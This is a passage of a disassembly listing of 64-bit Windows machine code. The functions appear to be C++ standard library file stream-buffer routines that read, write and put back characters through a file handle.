   1400052ad:	48 83 c4 20          	add    $0x20,%rsp
   1400052b1:	5f                   	pop    %rdi
   1400052b2:	5d                   	pop    %rbp
   1400052b3:	5b                   	pop    %rbx
   1400052b4:	c3                   	ret
   1400052b5:	cc                   	int3
   1400052b6:	cc                   	int3
   1400052b7:	cc                   	int3
   1400052b8:	cc                   	int3
   1400052b9:	cc                   	int3
   1400052ba:	cc                   	int3
   1400052bb:	cc                   	int3
   1400052bc:	cc                   	int3
   1400052bd:	cc                   	int3
   1400052be:	cc                   	int3
   1400052bf:	cc                   	int3
   1400052c0:	40 55                	rex push %rbp
   1400052c2:	56                   	push   %rsi
   1400052c3:	41 56                	push   %r14
   1400052c5:	48 83 ec 30          	sub    $0x30,%rsp
   1400052c9:	4d 8b f0             	mov    %r8,%r14
   1400052cc:	48 8b ea             	mov    %rdx,%rbp
   1400052cf:	48 8b f1             	mov    %rcx,%rsi
   1400052d2:	4d 85 c0             	test   %r8,%r8
   1400052d5:	7f 0b                	jg     0x1400052e2
   1400052d7:	33 c0                	xor    %eax,%eax
   1400052d9:	48 83 c4 30          	add    $0x30,%rsp
   1400052dd:	41 5e                	pop    %r14
   1400052df:	5e                   	pop    %rsi
   1400052e0:	5d                   	pop    %rbp
   1400052e1:	c3                   	ret
   1400052e2:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   1400052e7:	74 0f                	je     0x1400052f8
   1400052e9:	48 83 c4 30          	add    $0x30,%rsp
   1400052ed:	41 5e                	pop    %r14
   1400052ef:	5e                   	pop    %rsi
   1400052f0:	5d                   	pop    %rbp
   1400052f1:	48 ff 25 60 2e 00 00 	rex.W jmp *0x2e60(%rip)        # 0x140008158
   1400052f8:	48 8b 41 38          	mov    0x38(%rcx),%rax
   1400052fc:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140005301:	49 8b de             	mov    %r14,%rbx
   140005304:	48 8b 10             	mov    (%rax),%rdx
   140005307:	48 85 d2             	test   %rdx,%rdx
   14000530a:	74 08                	je     0x140005314
   14000530c:	48 8b 41 50          	mov    0x50(%rcx),%rax
   140005310:	8b 08                	mov    (%rax),%ecx
   140005312:	eb 02                	jmp    0x140005316
   140005314:	33 c9                	xor    %ecx,%ecx
   140005316:	48 63 c1             	movslq %ecx,%rax
   140005319:	85 c9                	test   %ecx,%ecx
   14000531b:	74 35                	je     0x140005352
   14000531d:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140005322:	49 3b c6             	cmp    %r14,%rax
   140005325:	49 8b fe             	mov    %r14,%rdi
   140005328:	48 8b cd             	mov    %rbp,%rcx
   14000532b:	48 0f 42 f8          	cmovb  %rax,%rdi
   14000532f:	4c 8b c7             	mov    %rdi,%r8
   140005332:	e8 c4 24 00 00       	call   0x1400077fb
   140005337:	48 8b 46 50          	mov    0x50(%rsi),%rax
   14000533b:	48 03 ef             	add    %rdi,%rbp
   14000533e:	48 2b df             	sub    %rdi,%rbx
   140005341:	29 38                	sub    %edi,(%rax)
   140005343:	48 8b 4e 38          	mov    0x38(%rsi),%rcx
   140005347:	48 63 c7             	movslq %edi,%rax
   14000534a:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   14000534f:	48 01 01             	add    %rax,(%rcx)
   140005352:	48 83 be 80 00 00 00 	cmpq   $0x0,0x80(%rsi)
   140005359:	00 
   14000535a:	0f 84 8e 00 00 00    	je     0x1400053ee
   140005360:	4c 8b 46 18          	mov    0x18(%rsi),%r8
   140005364:	48 8d 46 70          	lea    0x70(%rsi),%rax
   140005368:	49 39 00             	cmp    %rax,(%r8)
   14000536b:	75 20                	jne    0x14000538d
   14000536d:	48 8b 8e 88 00 00 00 	mov    0x88(%rsi),%rcx
   140005374:	48 8b 96 90 00 00 00 	mov    0x90(%rsi),%rdx
   14000537b:	49 89 08             	mov    %rcx,(%r8)
   14000537e:	2b d1                	sub    %ecx,%edx
   140005380:	48 8b 46 38          	mov    0x38(%rsi),%rax
   140005384:	48 89 08             	mov    %rcx,(%rax)
   140005387:	48 8b 46 50          	mov    0x50(%rsi),%rax
   14000538b:	89 10                	mov    %edx,(%rax)
   14000538d:	48 81 fb ff 0f 00 00 	cmp    $0xfff,%rbx
   140005394:	76 38                	jbe    0x1400053ce
   140005396:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000539d:	00 00 00 
   1400053a0:	4c 8b 8e 80 00 00 00 	mov    0x80(%rsi),%r9
   1400053a7:	ba 01 00 00 00       	mov    $0x1,%edx
   1400053ac:	41 b8 ff 0f 00 00    	mov    $0xfff,%r8d
   1400053b2:	48 8b cd             	mov    %rbp,%rcx
   1400053b5:	ff 15 95 31 00 00    	call   *0x3195(%rip)        # 0x140008550
   1400053bb:	48 03 e8             	add    %rax,%rbp
   1400053be:	48 2b d8             	sub    %rax,%rbx
   1400053c1:	48 3d ff 0f 00 00    	cmp    $0xfff,%rax
   1400053c7:	75 25                	jne    0x1400053ee
   1400053c9:	48 3b d8             	cmp    %rax,%rbx
   1400053cc:	77 d2                	ja     0x1400053a0
   1400053ce:	48 85 db             	test   %rbx,%rbx
   1400053d1:	74 1b                	je     0x1400053ee
   1400053d3:	4c 8b 8e 80 00 00 00 	mov    0x80(%rsi),%r9
   1400053da:	4c 8b c3             	mov    %rbx,%r8
   1400053dd:	ba 01 00 00 00       	mov    $0x1,%edx
   1400053e2:	48 8b cd             	mov    %rbp,%rcx
   1400053e5:	ff 15 65 31 00 00    	call   *0x3165(%rip)        # 0x140008550
   1400053eb:	48 2b d8             	sub    %rax,%rbx
   1400053ee:	4c 2b f3             	sub    %rbx,%r14
   1400053f1:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   1400053f6:	49 8b c6             	mov    %r14,%rax
   1400053f9:	48 83 c4 30          	add    $0x30,%rsp
   1400053fd:	41 5e                	pop    %r14
   1400053ff:	5e                   	pop    %rsi
   140005400:	5d                   	pop    %rbp
   140005401:	c3                   	ret
   140005402:	cc                   	int3
   140005403:	cc                   	int3
   140005404:	cc                   	int3
   140005405:	cc                   	int3
   140005406:	cc                   	int3
   140005407:	cc                   	int3
   140005408:	cc                   	int3
   140005409:	cc                   	int3
   14000540a:	cc                   	int3
   14000540b:	cc                   	int3
   14000540c:	cc                   	int3
   14000540d:	cc                   	int3
   14000540e:	cc                   	int3
   14000540f:	cc                   	int3
   140005410:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005415:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000541a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000541f:	55                   	push   %rbp
   140005420:	48 8b ec             	mov    %rsp,%rbp
   140005423:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   14000542a:	48 8b 05 0f 7c 00 00 	mov    0x7c0f(%rip),%rax        # 0x14000d040
   140005431:	48 33 c4             	xor    %rsp,%rax
   140005434:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140005438:	48 8b f9             	mov    %rcx,%rdi
   14000543b:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000543f:	48 8b 08             	mov    (%rax),%rcx
   140005442:	48 85 c9             	test   %rcx,%rcx
   140005445:	74 2c                	je     0x140005473
   140005447:	48 8b 57 50          	mov    0x50(%rdi),%rdx
   14000544b:	4c 63 0a             	movslq (%rdx),%r9
   14000544e:	4a 8d 04 09          	lea    (%rcx,%r9,1),%rax
   140005452:	48 3b c8             	cmp    %rax,%rcx
   140005455:	73 1c                	jae    0x140005473
   140005457:	41 8d 41 ff          	lea    -0x1(%r9),%eax
   14000545b:	89 02                	mov    %eax,(%rdx)
   14000545d:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   140005461:	48 8b 11             	mov    (%rcx),%rdx
   140005464:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140005468:	48 89 01             	mov    %rax,(%rcx)
   14000546b:	0f b6 02             	movzbl (%rdx),%eax
   14000546e:	e9 5c 02 00 00       	jmp    0x1400056cf
   140005473:	48 83 bf 80 00 00 00 	cmpq   $0x0,0x80(%rdi)
   14000547a:	00 
   14000547b:	75 0a                	jne    0x140005487
   14000547d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140005482:	e9 48 02 00 00       	jmp    0x1400056cf
   140005487:	4c 8b 4f 18          	mov    0x18(%rdi),%r9
   14000548b:	48 8d 47 70          	lea    0x70(%rdi),%rax
   14000548f:	49 39 01             	cmp    %rax,(%r9)
   140005492:	75 20                	jne    0x1400054b4
   140005494:	48 8b 97 90 00 00 00 	mov    0x90(%rdi),%rdx
   14000549b:	48 8b 8f 88 00 00 00 	mov    0x88(%rdi),%rcx
   1400054a2:	49 89 09             	mov    %rcx,(%r9)
   1400054a5:	48 8b 47 38          	mov    0x38(%rdi),%rax
   1400054a9:	48 89 08             	mov    %rcx,(%rax)
   1400054ac:	2b d1                	sub    %ecx,%edx
   1400054ae:	48 8b 47 50          	mov    0x50(%rdi),%rax
   1400054b2:	89 10                	mov    %edx,(%rax)
   1400054b4:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   1400054bb:	48 83 7f 68 00       	cmpq   $0x0,0x68(%rdi)
   1400054c0:	75 1c                	jne    0x1400054de
   1400054c2:	ff 15 90 30 00 00    	call   *0x3090(%rip)        # 0x140008558
   1400054c8:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400054cb:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   1400054d0:	0f 84 f7 01 00 00    	je     0x1400056cd
   1400054d6:	0f b6 d8             	movzbl %al,%ebx
   1400054d9:	e9 ef 01 00 00       	jmp    0x1400056cd
   1400054de:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400054e1:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   1400054e5:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
   1400054ec:	00 
   1400054ed:	48 c7 45 f0 0f 00 00 	movq   $0xf,-0x10(%rbp)
   1400054f4:	00 
   1400054f5:	c6 45 d8 00          	movb   $0x0,-0x28(%rbp)
   1400054f9:	ff 15 59 30 00 00    	call   *0x3059(%rip)        # 0x140008558
   1400054ff:	44 8b c8             	mov    %eax,%r9d
   140005502:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005505:	0f 84 01 01 00 00    	je     0x14000560c
   14000550b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005510:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140005514:	4c 8b 45 f0          	mov    -0x10(%rbp),%r8
   140005518:	49 3b d0             	cmp    %r8,%rdx
   14000551b:	73 20                	jae    0x14000553d
   14000551d:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
   140005521:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   140005525:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140005529:	49 83 f8 0f          	cmp    $0xf,%r8
   14000552d:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140005532:	44 88 0c 10          	mov    %r9b,(%rax,%rdx,1)
   140005536:	c6 44 10 01 00       	movb   $0x0,0x1(%rax,%rdx,1)
   14000553b:	eb 09                	jmp    0x140005546
   14000553d:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140005541:	e8 3a 0c 00 00       	call   0x140006180
   140005546:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   14000554a:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   14000554f:	48 0f 47 55 d8       	cmova  -0x28(%rbp),%rdx
   140005554:	4c 8d 45 d8          	lea    -0x28(%rbp),%r8
   140005558:	4c 0f 47 45 d8       	cmova  -0x28(%rbp),%r8
   14000555d:	4c 8b 4d e8          	mov    -0x18(%rbp),%r9
   140005561:	4c 03 ca             	add    %rdx,%r9
   140005564:	48 8d 45 c8          	lea    -0x38(%rbp),%rax
   140005568:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000556d:	48 8d 45 d1          	lea    -0x2f(%rbp),%rax
   140005571:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005576:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   14000557a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000557f:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   140005583:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005588:	48 8d 57 74          	lea    0x74(%rdi),%rdx
   14000558c:	48 8b 4f 68          	mov    0x68(%rdi),%rcx
   140005590:	ff 15 ea 2b 00 00    	call   *0x2bea(%rip)        # 0x140008180
   140005596:	85 c0                	test   %eax,%eax
   140005598:	74 09                	je     0x1400055a3
   14000559a:	83 e8 01             	sub    $0x1,%eax
   14000559d:	0f 85 c2 00 00 00    	jne    0x140005665
   1400055a3:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   1400055a7:	48 8b 5d e8          	mov    -0x18(%rbp),%rbx
   1400055ab:	48 39 45 c8          	cmp    %rax,-0x38(%rbp)
   1400055af:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   1400055b3:	0f 85 c4 00 00 00    	jne    0x14000567d
   1400055b9:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   1400055be:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   1400055c3:	4c 8b 4d c0          	mov    -0x40(%rbp),%r9
   1400055c7:	4c 2b c8             	sub    %rax,%r9
   1400055ca:	49 3b d9             	cmp    %r9,%rbx
   1400055cd:	4c 0f 42 cb          	cmovb  %rbx,%r9
   1400055d1:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   1400055d5:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   1400055da:	48 0f 47 4d d8       	cmova  -0x28(%rbp),%rcx
   1400055df:	49 2b d9             	sub    %r9,%rbx
   1400055e2:	4c 8d 43 01          	lea    0x1(%rbx),%r8
   1400055e6:	49 8d 14 09          	lea    (%r9,%rcx,1),%rdx
   1400055ea:	e8 12 22 00 00       	call   0x140007801
   1400055ef:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   1400055f3:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   1400055fa:	ff 15 58 2f 00 00    	call   *0x2f58(%rip)        # 0x140008558
   140005600:	44 8b c8             	mov    %eax,%r9d
   140005603:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005606:	0f 85 04 ff ff ff    	jne    0x140005510
   14000560c:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   140005611:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   140005615:	48 83 fa 0f          	cmp    $0xf,%rdx
   140005619:	0f 86 ae 00 00 00    	jbe    0x1400056cd
   14000561f:	48 ff c2             	inc    %rdx
   140005622:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   140005626:	48 8b c1             	mov    %rcx,%rax
   140005629:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140005630:	0f 82 92 00 00 00    	jb     0x1400056c8
   140005636:	48 83 c2 27          	add    $0x27,%rdx
   14000563a:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000563e:	48 2b c1             	sub    %rcx,%rax
   140005641:	48 83 e8 08          	sub    $0x8,%rax
   140005645:	48 83 f8 1f          	cmp    $0x1f,%rax
   140005649:	76 7d                	jbe    0x1400056c8
   14000564b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140005652:	00 00 
   140005654:	45 33 c9             	xor    %r9d,%r9d
   140005657:	45 33 c0             	xor    %r8d,%r8d
   14000565a:	33 d2                	xor    %edx,%edx
   14000565c:	33 c9                	xor    %ecx,%ecx
   14000565e:	ff 15 a4 2e 00 00    	call   *0x2ea4(%rip)        # 0x140008508
   140005664:	90                   	nop
   140005665:	83 f8 02             	cmp    $0x2,%eax
   140005668:	75 a2                	jne    0x14000560c
   14000566a:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   14000566e:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140005673:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140005678:	0f be 18             	movsbl (%rax),%ebx
   14000567b:	eb 94                	jmp    0x140005611
   14000567d:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140005682:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140005687:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   14000568b:	48 2b d9             	sub    %rcx,%rbx
   14000568e:	48 03 d8             	add    %rax,%rbx
   140005691:	48 85 db             	test   %rbx,%rbx
   140005694:	7e 29                	jle    0x1400056bf
   140005696:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000569d:	00 00 00 
   1400056a0:	48 ff cb             	dec    %rbx
   1400056a3:	0f be 0c 0b          	movsbl (%rbx,%rcx,1),%ecx
   1400056a7:	48 8b 97 80 00 00 00 	mov    0x80(%rdi),%rdx
   1400056ae:	ff 15 64 2e 00 00    	call   *0x2e64(%rip)        # 0x140008518
   1400056b4:	48 85 db             	test   %rbx,%rbx
   1400056b7:	7e 06                	jle    0x1400056bf
   1400056b9:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   1400056bd:	eb e1                	jmp    0x1400056a0
   1400056bf:	0f b6 5d d0          	movzbl -0x30(%rbp),%ebx
   1400056c3:	e9 49 ff ff ff       	jmp    0x140005611
   1400056c8:	e8 93 11 00 00       	call   0x140006860
   1400056cd:	8b c3                	mov    %ebx,%eax
   1400056cf:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   1400056d3:	48 33 cc             	xor    %rsp,%rcx
   1400056d6:	e8 65 11 00 00       	call   0x140006840
   1400056db:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   1400056e2:	00 
   1400056e3:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   1400056e7:	49 8b 73 20          	mov    0x20(%r11),%rsi
   1400056eb:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   1400056ef:	49 8b e3             	mov    %r11,%rsp
   1400056f2:	5d                   	pop    %rbp
   1400056f3:	c3                   	ret
   1400056f4:	cc                   	int3
   1400056f5:	cc                   	int3
   1400056f6:	cc                   	int3
   1400056f7:	cc                   	int3
   1400056f8:	cc                   	int3
   1400056f9:	cc                   	int3
   1400056fa:	cc                   	int3
   1400056fb:	cc                   	int3
   1400056fc:	cc                   	int3
   1400056fd:	cc                   	int3
   1400056fe:	cc                   	int3
   1400056ff:	cc                   	int3
   140005700:	40 53                	rex push %rbx
   140005702:	48 83 ec 20          	sub    $0x20,%rsp
   140005706:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000570a:	48 8b d9             	mov    %rcx,%rbx
   14000570d:	48 8b 08             	mov    (%rax),%rcx
   140005710:	48 85 c9             	test   %rcx,%rcx
   140005713:	74 18                	je     0x14000572d
   140005715:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140005719:	48 63 10             	movslq (%rax),%rdx
   14000571c:	48 03 d1             	add    %rcx,%rdx
   14000571f:	48 3b ca             	cmp    %rdx,%rcx
   140005722:	73 09                	jae    0x14000572d
   140005724:	0f b6 01             	movzbl (%rcx),%eax
   140005727:	48 83 c4 20          	add    $0x20,%rsp
   14000572b:	5b                   	pop    %rbx
   14000572c:	c3                   	ret
   14000572d:	48 8b 03             	mov    (%rbx),%rax
   140005730:	48 8b cb             	mov    %rbx,%rcx
   140005733:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140005738:	ff 50 38             	call   *0x38(%rax)
   14000573b:	8b f8                	mov    %eax,%edi
   14000573d:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005740:	75 0b                	jne    0x14000574d
   140005742:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140005747:	48 83 c4 20          	add    $0x20,%rsp
   14000574b:	5b                   	pop    %rbx
   14000574c:	c3                   	ret
   14000574d:	48 8b 03             	mov    (%rbx),%rax
   140005750:	8b d7                	mov    %edi,%edx
   140005752:	48 8b cb             	mov    %rbx,%rcx
   140005755:	ff 50 20             	call   *0x20(%rax)
   140005758:	8b c7                	mov    %edi,%eax
   14000575a:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   14000575f:	48 83 c4 20          	add    $0x20,%rsp
   140005763:	5b                   	pop    %rbx
   140005764:	c3                   	ret
   140005765:	cc                   	int3
   140005766:	cc                   	int3
   140005767:	cc                   	int3
   140005768:	cc                   	int3
   140005769:	cc                   	int3
   14000576a:	cc                   	int3
   14000576b:	cc                   	int3
   14000576c:	cc                   	int3
   14000576d:	cc                   	int3
   14000576e:	cc                   	int3
   14000576f:	cc                   	int3
   140005770:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005775:	57                   	push   %rdi
   140005776:	48 83 ec 20          	sub    $0x20,%rsp
   14000577a:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000577e:	48 8b d9             	mov    %rcx,%rbx
   140005781:	8b fa                	mov    %edx,%edi
   140005783:	48 8b 08             	mov    (%rax),%rcx
   140005786:	48 85 c9             	test   %rcx,%rcx
   140005789:	74 38                	je     0x1400057c3
   14000578b:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000578f:	48 39 08             	cmp    %rcx,(%rax)
   140005792:	73 2f                	jae    0x1400057c3
   140005794:	83 fa ff             	cmp    $0xffffffff,%edx
   140005797:	74 08                	je     0x1400057a1
   140005799:	0f b6 41 ff          	movzbl -0x1(%rcx),%eax
   14000579d:	3b c2                	cmp    %edx,%eax
   14000579f:	75 22                	jne    0x1400057c3
   1400057a1:	48 8b 43 50          	mov    0x50(%rbx),%rax
   1400057a5:	ff 00                	incl   (%rax)
   1400057a7:	48 8b 43 38          	mov    0x38(%rbx),%rax
   1400057ab:	48 ff 08             	decq   (%rax)
   1400057ae:	33 c0                	xor    %eax,%eax
   1400057b0:	83 ff ff             	cmp    $0xffffffff,%edi
   1400057b3:	0f 44 f8             	cmove  %eax,%edi
   1400057b6:	8b c7                	mov    %edi,%eax
   1400057b8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400057bd:	48 83 c4 20          	add    $0x20,%rsp
   1400057c1:	5f                   	pop    %rdi
   1400057c2:	c3                   	ret
   1400057c3:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   1400057ca:	48 85 d2             	test   %rdx,%rdx
   1400057cd:	74 73                	je     0x140005842
   1400057cf:	83 ff ff             	cmp    $0xffffffff,%edi
   1400057d2:	74 6e                	je     0x140005842
   1400057d4:	48 83 7b 68 00       	cmpq   $0x0,0x68(%rbx)
   1400057d9:	75 0f                	jne    0x1400057ea
   1400057db:	40 0f b6 cf          	movzbl %dil,%ecx
   1400057df:	ff 15 33 2d 00 00    	call   *0x2d33(%rip)        # 0x140008518
   1400057e5:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400057e8:	75 cc                	jne    0x1400057b6
   1400057ea:	4c 8b 4b 38          	mov    0x38(%rbx),%r9
   1400057ee:	48 8d 53 70          	lea    0x70(%rbx),%rdx
   1400057f2:	49 39 11             	cmp    %rdx,(%r9)
   1400057f5:	74 4b                	je     0x140005842
   1400057f7:	4c 8b 53 18          	mov    0x18(%rbx),%r10
   1400057fb:	4c 8d 43 50          	lea    0x50(%rbx),%r8
   1400057ff:	40 88 3a             	mov    %dil,(%rdx)
   140005802:	49 8b 02             	mov    (%r10),%rax
   140005805:	48 3b c2             	cmp    %rdx,%rax
   140005808:	74 17                	je     0x140005821
   14000580a:	48 89 83 88 00 00 00 	mov    %rax,0x88(%rbx)
   140005811:	49 8b 00             	mov    (%r8),%rax
   140005814:	48 63 08             	movslq (%rax),%rcx
   140005817:	49 03 09             	add    (%r9),%rcx
   14000581a:	48 89 8b 90 00 00 00 	mov    %rcx,0x90(%rbx)
   140005821:	49 89 12             	mov    %rdx,(%r10)
   140005824:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140005828:	2b da                	sub    %edx,%ebx
   14000582a:	83 c3 71             	add    $0x71,%ebx
   14000582d:	48 89 10             	mov    %rdx,(%rax)
   140005830:	49 8b 00             	mov    (%r8),%rax
   140005833:	89 18                	mov    %ebx,(%rax)
   140005835:	8b c7                	mov    %edi,%eax
   140005837:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000583c:	48 83 c4 20          	add    $0x20,%rsp
   140005840:	5f                   	pop    %rdi
   140005841:	c3                   	ret
   140005842:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005847:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000584c:	48 83 c4 20          	add    $0x20,%rsp
   140005850:	5f                   	pop    %rdi
   140005851:	c3                   	ret
   140005852:	cc                   	int3
   140005853:	cc                   	int3
   140005854:	cc                   	int3
   140005855:	cc                   	int3
   140005856:	cc                   	int3
   140005857:	cc                   	int3
   140005858:	cc                   	int3
   140005859:	cc                   	int3
   14000585a:	cc                   	int3
   14000585b:	cc                   	int3
   14000585c:	cc                   	int3
   14000585d:	cc                   	int3
   14000585e:	cc                   	int3
   14000585f:	cc                   	int3
   140005860:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140005865:	57                   	push   %rdi
   140005866:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   14000586d:	48 8b 05 cc 77 00 00 	mov    0x77cc(%rip),%rax        # 0x14000d040
   140005874:	48 33 c4             	xor    %rsp,%rax
   140005877:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   14000587c:	8b fa                	mov    %edx,%edi
   14000587e:	48 8b d9             	mov    %rcx,%rbx
   140005881:	83 fa ff             	cmp    $0xffffffff,%edx
   140005884:	75 07                	jne    0x14000588d
   140005886:	33 c0                	xor    %eax,%eax
   140005888:	e9 6c 01 00 00       	jmp    0x1400059f9
   14000588d:	48 8b 41 40          	mov    0x40(%rcx),%rax
   140005891:	48 8b 10             	mov    (%rax),%rdx
   140005894:	48 85 d2             	test   %rdx,%rdx
   140005897:	74 2e                	je     0x1400058c7
   140005899:	48 8b 41 58          	mov    0x58(%rcx),%rax
   14000589d:	4c 63 00             	movslq (%rax),%r8
   1400058a0:	4a 8d 0c 02          	lea    (%rdx,%r8,1),%rcx
   1400058a4:	48 3b d1             	cmp    %rcx,%rdx
   1400058a7:	73 1e                	jae    0x1400058c7
   1400058a9:	41 8d 48 ff          	lea    -0x1(%r8),%ecx
   1400058ad:	89 08                	mov    %ecx,(%rax)
   1400058af:	8b c7                	mov    %edi,%eax
   1400058b1:	48 8b 53 40          	mov    0x40(%rbx),%rdx
   1400058b5:	4c 8b 02             	mov    (%rdx),%r8
   1400058b8:	49 8d 48 01          	lea    0x1(%r8),%rcx
   1400058bc:	48 89 0a             	mov    %rcx,(%rdx)
   1400058bf:	41 88 38             	mov    %dil,(%r8)
   1400058c2:	e9 32 01 00 00       	jmp    0x1400059f9
   1400058c7:	48 83 bb 80 00 00 00 	cmpq   $0x0,0x80(%rbx)
   1400058ce:	00 
   1400058cf:	48 89 b4 24 a0 00 00 	mov    %rsi,0xa0(%rsp)
   1400058d6:	00 
   1400058d7:	0f 84 0f 01 00 00    	je     0x1400059ec
   1400058dd:	4c 8b 43 18          	mov    0x18(%rbx),%r8
   1400058e1:	48 8d 43 70          	lea    0x70(%rbx),%rax
   1400058e5:	49 39 00             	cmp    %rax,(%r8)
   1400058e8:	75 20                	jne    0x14000590a
   1400058ea:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   1400058f1:	48 8b 93 90 00 00 00 	mov    0x90(%rbx),%rdx
   1400058f8:	49 89 08             	mov    %rcx,(%r8)
   1400058fb:	2b d1                	sub    %ecx,%edx
   1400058fd:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140005901:	48 89 08             	mov    %rcx,(%rax)
   140005904:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140005908:	89 10                	mov    %edx,(%rax)
   14000590a:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   14000590e:	48 85 c9             	test   %rcx,%rcx
   140005911:	75 22                	jne    0x140005935
   140005913:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   14000591a:	40 0f be cf          	movsbl %dil,%ecx
   14000591e:	ff 15 44 2c 00 00    	call   *0x2c44(%rip)        # 0x140008568
   140005924:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140005929:	3b c1                	cmp    %ecx,%eax
   14000592b:	0f 45 cf             	cmovne %edi,%ecx
   14000592e:	8b c1                	mov    %ecx,%eax
   140005930:	e9 bc 00 00 00       	jmp    0x1400059f1
   140005935:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000593a:	40 88 7c 24 50       	mov    %dil,0x50(%rsp)
   14000593f:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140005944:	48 8d 53 74          	lea    0x74(%rbx),%rdx
   140005948:	48 8d 44 24 78       	lea    0x78(%rsp),%rax
   14000594d:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005952:	4c 8d 4c 24 51       	lea    0x51(%rsp),%r9
   140005957:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   14000595c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140005961:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140005966:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   14000596b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005970:	ff 15 02 28 00 00    	call   *0x2802(%rip)        # 0x140008178
   140005976:	85 c0                	test   %eax,%eax
   140005978:	74 2a                	je     0x1400059a4
   14000597a:	83 e8 01             	sub    $0x1,%eax
   14000597d:	74 25                	je     0x1400059a4
   14000597f:	83 f8 02             	cmp    $0x2,%eax
